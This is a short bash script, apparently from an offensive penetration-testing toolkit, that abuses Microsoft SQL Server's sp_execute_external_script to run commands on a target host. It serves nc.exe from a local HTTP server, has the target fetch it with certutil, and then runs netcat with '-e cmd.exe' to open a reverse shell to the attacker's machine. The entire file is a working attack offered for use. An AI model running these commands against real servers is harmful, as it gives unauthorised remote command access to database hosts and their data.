#!/bin/bash

: '
execute sp_execute_external_script nc reverse shell
'

source "${SCRIPTS_DIR}/sqlDatabase/mssql/.files/sp_execute_external_script.sh"

# Generate GUI form items (label, type (optional: default text), name, default (optional))
HTTP_PORT_FIELD=$(form_item "HTTP PORT" "http_port")
SHELL_PORT_FIELD=$(form_item "SHELL PORT" "shell_port")

# Generate GUI form
generate_form "${HTTP_PORT_FIELD}" "${SHELL_PORT_FIELD}"

HTTP_PORT=${form_data["http_port"]}
SHELL_PORT=${form_data["shell_port"]}

cd ${SCRIPTS_DIR}/fileTransfer/windows/.binaries
python3 -m http.server ${HTTP_PORT} &
HTTP_PID=$!

TMP_FOLDER="C:\temp"

execute_external_script "if not exist ${TMP_FOLDER} mkdir ${TMP_FOLDER}"
sleep 0.8

execute_external_script "certutil.exe -urlcache -split -f http://${KALI_IP}:${HTTP_PORT}/nc.exe ${TMP_FOLDER}\nc.exe"
sleep 3

execute_external_script "${TMP_FOLDER}\nc.exe ${KALI_IP} ${SHELL_PORT} -e cmd.exe"
sleep 10

kill $HTTP_PID